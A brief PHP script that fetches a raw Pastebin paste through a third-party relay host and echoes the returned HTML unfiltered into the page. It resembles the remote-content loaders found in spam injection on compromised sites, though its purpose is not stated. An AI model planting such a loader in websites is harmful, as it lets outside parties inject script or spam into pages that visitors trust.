<?php
header("Content-Type:text/html;charset=utf-8");
$keyworld="https://pastebin.com/raw/5NHaxyGR"; 
$keyworld=iconv("utf-8","gb2312",$keyworld);
$url = "http://lige.unaux.com/?url=$keyworld";
$html = file_get_contents($url);
$html = iconv("gb2312", "utf-8//IGNORE",$html);
echo $html;
